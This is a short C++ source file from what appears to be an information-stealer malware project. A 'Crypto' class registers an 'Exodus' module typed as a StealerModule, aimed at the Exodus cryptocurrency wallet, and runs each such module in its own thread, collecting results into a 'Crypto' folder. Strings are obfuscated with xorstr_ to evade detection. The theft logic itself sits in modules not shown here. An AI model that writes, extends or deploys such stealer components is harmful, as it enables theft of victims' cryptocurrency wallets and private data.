//
// Created by TERETERY on 07.06.2024.
//

#include <thread>
#include "Crypto.h"
#include "impl/Exodus.h"

Crypto::Crypto()
{
    this->modules.push_back(new Exodus());
}

void Crypto::execute(fs::path &root) {
    fs::path crypto_path = root / xorstr_("Crypto");
    std::vector<std::thread> threads;

    for(StealerModule* module : this->modules) {
        threads.emplace_back([module, &crypto_path]() {
            module->execute(crypto_path);
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}